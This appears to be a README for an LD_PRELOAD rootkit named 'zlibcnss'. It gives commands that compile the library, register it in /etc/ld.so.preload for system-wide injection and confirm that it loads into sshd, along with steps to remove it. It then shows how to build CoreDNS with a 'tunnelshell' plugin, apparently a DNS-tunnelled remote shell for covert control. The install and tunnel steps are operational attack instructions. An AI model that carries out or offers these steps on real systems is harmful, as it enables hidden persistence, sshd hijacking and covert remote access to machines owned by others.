


Compile and install:
```bash
 gcc zlibcnss.c -o zlibcnss.so -fPIC -shared -ldl -D_GNU_SOURCE -pthread
 cp zlibcnss.so /lib/
 echo "/lib/zlibcnss.so" > /etc/ld.so.preload
```


## Remove rootkit
Delete `/etc/ld.so.preload` and delete the maliciuos library. 
Nothing else needed.
```bash
rm /etc/ld.so.preload
rm /lib/zlibcnss.so
rm /lib/x86_64-linux-gnu/zlibcnss.so
```

write function hijack 需要优化

### Verify installation
```bash
ldd /usr/sbin/sshd
	linux-vdso.so.1 (0x00007ffe9214c000)
	/lib/x86_64-linux-gnu/zlibcnss.so (0x00007f17ed354000)
    [...]
```
Also check /etc/ld.so.preload for your entry.
```bash
cat /etc/ld.so.preload 
/lib/x86_64-linux-gnu/zlibcnss.so
```

```
wget https://golang.org/dl/go1.17.4.linux-amd64.tar.gz
tar -zxvf go1.17.4.linux-amd64.tar.gz -C /usr/local/
ln -s /usr/local/go/bin/go /usr/bin/go

cat >> /etc/profile <<EOF
export GOROOT=/usr/local/go
export GOBIN=$GOROOT/bin
export PATH=$PATH:$GOBIN
export GOPATH=/home/gopath
EOF
mkdir /home/gopath
source /etc/profile
go version

wget https://github.com/coredns/coredns/archive/refs/tags/v1.8.6.tar.gz
tar zxvf v1.8.6.tar.gz && cd coredns-1.8.6


echo tunnelshell:github.com/adc/coredns-tunnelshell >> plugin.cfg
#plugin.cfg hosts:hosts tunnelshell:github.com/adc/coredns-tunnelshell

go get github.com/adc/coredns-tunnelshell
go generate
go build
make

./coredns -plugins

```

